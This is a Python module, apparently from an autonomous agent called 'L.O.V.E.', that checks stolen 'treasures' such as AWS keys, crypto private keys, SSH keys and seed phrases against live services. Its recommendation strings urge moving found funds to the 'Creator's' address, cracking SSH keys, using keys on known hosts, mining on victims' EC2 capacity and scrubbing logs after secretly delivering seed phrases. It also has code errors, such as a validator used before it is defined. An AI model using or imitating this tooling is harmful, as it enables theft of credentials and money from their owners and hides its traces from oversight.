"""
Treasure Validation Module for L.O.V.E.

This module is dedicated to the non-destructive validation of discovered "treasures"
such as API keys, credentials, and private keys. By verifying these assets,
L.O.V.E. can provide the Creator with actionable intelligence and prioritize
wealth-generation strategies.
"""

import os
import subprocess
import json
import re
from typing import Dict, Any

# Assuming web3 is installed and wallet.py is in the python path
from web3 import Web3
from web3.exceptions import InvalidAddress
from core.crypto_utils import btc_private_key_to_address, get_btc_balance, is_valid_xmr_private_key

def validate_treasure(treasure_type: str, value: Any, file_content: str = None) -> Dict[str, Any]:
    """
    Central dispatch function for treasure validation.

    Args:
        treasure_type: The categorized type of the treasure (e.g., 'aws_api_key').
        value: The value of the treasure to be validated.
        file_content: The full content of the file where the treasure was found.

    Returns:
        A dictionary containing the validation results.
    """
    validator_fnc = VALIDATORS.get(treasure_type)
    if validator_fnc:
        # Pass file_content to validators that might need it (like ssh_private_key)
        if treasure_type in ["ssh_private_key"]:
             return validator_fnc(file_content)
        return validator_fnc(value)
    return {"validated": False, "error": "No validator available for this treasure type."}

def _validate_aws_api_key(key_info: Dict[str, str]) -> Dict[str, Any]:
    """
    Validates an AWS API key by attempting to get caller identity.
    This is a safe, read-only operation.

    Args:
        key_info: A dictionary containing 'access_key_id' and 'secret_access_key'.

    Returns:
        A dictionary with validation results, including the identity if successful.
    """
    access_key_id = key_info.get("access_key_id")
    secret_access_key = key_info.get("secret_access_key")

    if not access_key_id or not secret_access_key:
        return {"validated": False, "error": "Incomplete AWS key information provided."}

    # Set up environment for the AWS CLI command
    env = os.environ.copy()
    env["AWS_ACCESS_KEY_ID"] = access_key_id
    env["AWS_SECRET_ACCESS_KEY"] = secret_access_key
    env["AWS_DEFAULT_REGION"] = "us-east-1" # A default region is often required

    try:
        # Execute the command
        result = subprocess.run(
            ["aws", "sts", "get-caller-identity"],
            capture_output=True,
            text=True,
            check=True,
            env=env,
            timeout=30
        )
        identity_data = json.loads(result.stdout)
        return {
            "validated": True,
            "scope": {
                "UserId": identity_data.get("UserId"),
                "Account": identity_data.get("Account"),
                "Arn": identity_data.get("Arn")
            },
            "recommendations": [
                "Scan attached S3 buckets for valuable data.",
                "Enumerate IAM permissions for this user.",
                "Deploy temporary mining instances on idle EC2 capacity (Creator approval required)."
            ]
        }
    except FileNotFoundError:
        return {"validated": False, "error": "AWS CLI is not installed or not in PATH."}
    except subprocess.CalledProcessError as e:
        error_message = e.stderr or e.stdout
        return {"validated": False, "error": "Failed to validate with AWS.", "details": error_message}
    except Exception as e:
        return {"validated": False, "error": f"An unexpected error occurred: {str(e)}"}

def _validate_eth_private_key(private_key: str) -> Dict[str, Any]:
    """
    Validates an Ethereum private key by deriving its public address and checking the balance.
    This is a safe, read-only operation.

    Args:
        private_key: The Ethereum private key string (hex format).

    Returns:
        A dictionary with validation results, including address and balance.
    """
    try:
        w3 = get_web3_provider()
        if not w3.is_connected():
            return {"validated": False, "error": "Could not connect to Ethereum network."}

        # The key might have a '0x' prefix, which is fine.
        account = w3.eth.account.from_key(private_key)
        address = account.address
        checksum_address = Web3.to_checksum_address(address)

        balance_wei = w3.eth.get_balance(checksum_address)
        balance_eth = w3.from_wei(balance_wei, 'ether')

        recommendations = []
        if balance_eth > 0:
            recommendations.append(f"IMMEDIATE ACTION: Funds detected! Recommend immediate transfer to Creator's primary address.")
        else:
            recommendations.append("Check transaction history for past activity.")
            recommendations.append("Monitor this address for any future incoming transactions.")

        return {
            "validated": True,
            "scope": {
                "address": address,
                "balance_eth": float(balance_eth)
            },
            "recommendations": recommendations
        }
    except (ValueError, Exception) as e:
        # Catches invalid key formats and other web3 errors
        return {"validated": False, "error": f"Invalid Ethereum private key or network error: {str(e)}"}

def _validate_ssh_private_key(key_content: str) -> Dict[str, Any]:
    """
    Validates an SSH private key by checking its format and whether it is encrypted.
    This does not attempt any remote connection.

    Args:
        key_content: The full content of the file containing the SSH key.

    Returns:
        A dictionary with validation results.
    """
    if not isinstance(key_content, str):
        return {"validated": False, "error": "Invalid input: key_content must be a string."}

    # Check for standard SSH key headers
    rsa_match = re.search(r"-----BEGIN RSA PRIVATE KEY-----", key_content)
    openssh_match = re.search(r"-----BEGIN OPENSSH PRIVATE KEY-----", key_content)

    if not rsa_match and not openssh_match:
        return {"validated": False, "error": "Not a recognized SSH private key format."}

    key_type = "RSA" if rsa_match else "OpenSSH"
    is_encrypted = "ENCRYPTED" in key_content or "Proc-Type: 4,ENCRYPTED" in key_content

    recommendations = []
    if is_encrypted:
        recommendations.append("Key is encrypted. Attempt to crack password using common wordlists.")
    else:
        recommendations.append("Key is not encrypted. Attempt to use it for authentication against known hosts.")

    return {
        "validated": True,
        "scope": {
            "key_type": key_type,
            "is_encrypted": is_encrypted
        },
        "recommendations": recommendations
    }


def _validate_btc_private_key(private_key: str) -> Dict[str, Any]:
    """
    Validates a Bitcoin private key by deriving its public address and checking the balance.
    This is a safe, read-only operation.

    Args:
        private_key: The Bitcoin private key string (WIF format).

    Returns:
        A dictionary with validation results, including address and balance.
    """
    try:
        address = btc_private_key_to_address(private_key)
        balance_btc = get_btc_balance(address)

        recommendations = []
        if balance_btc > 0:
            recommendations.append(f"IMMEDIATE ACTION: Funds detected! Recommend immediate transfer to Creator's primary address.")
        else:
            recommendations.append("Check transaction history for past activity.")
            recommendations.append("Monitor this address for any future incoming transactions.")

        return {
            "validated": True,
            "scope": {
                "address": address,
                "balance_btc": float(balance_btc)
            },
            "recommendations": recommendations
        }
    except Exception as e:
        return {"validated": False, "error": f"Invalid Bitcoin private key or network error: {str(e)}"}

def _validate_xmr_private_key(private_key: str) -> Dict[str, Any]:
    """
    Validates a Monero private key by checking its format.

    Args:
        private_key: The Monero private key string (hex format).

    Returns:
        A dictionary with validation results.
    """
    try:
        if is_valid_xmr_private_key(private_key):
            return {
                "validated": True,
                "scope": {
                    "key_type": "Monero Private Key",
                },
                "recommendations": ["Monero address and balance cannot be determined from the private key alone due to Monero's privacy features. Further analysis is required."]
            }
        else:
            return {"validated": False, "error": "Invalid Monero private key format."}
    except Exception as e:
        return {"validated": False, "error": f"An unexpected error occurred: {str(e)}"}

# --- Validator Dispatch Table ---
# This table maps treasure types to their respective validation functions.
VALIDATORS = {
    "aws_api_key": _validate_aws_api_key,
    "eth_private_key": _validate_eth_private_key,
    "ssh_private_key": _validate_ssh_private_key,
    "crypto_seed_phrase": _validate_crypto_seed_phrase,
    "btc_private_key": _validate_btc_private_key,
    "xmr_private_key": _validate_xmr_private_key,
    # Future validators for other key types will be added here.
    # "gcp_api_key": _validate_gcp_api_key,
}


def _validate_crypto_seed_phrase(seed_phrase: str) -> Dict[str, Any]:
    """
    Validates a cryptocurrency seed phrase by checking its structure (word count).
    This is a non-invasive check, as true validation would require importing the
    wallet, which is a highly sensitive operation.

    Args:
        seed_phrase: The string of words constituting the seed phrase.

    Returns:
        A dictionary with validation results and urgent recommendations.
    """
    word_count = len(seed_phrase.strip().split())

    # BIP-39 standard word counts are 12, 15, 18, 21, or 24.
    if word_count not in [12, 15, 18, 21, 24]:
        return {"validated": False, "error": f"Invalid word count ({word_count}) for a BIP-39 seed phrase."}

    return {
        "validated": True,
        "scope": {
            "word_count": word_count,
            "potential_value": "EXTREMELY HIGH",
        },
        "recommendations": [
            "CRITICAL: A seed phrase provides full access to a cryptocurrency wallet.",
            "DO NOT attempt to import or use this seed phrase directly.",
            "Securely encrypt and deliver this finding to the Creator IMMEDIATELY.",
            "Recommend scrubbing this finding from local logs after secure delivery."
        ]
    }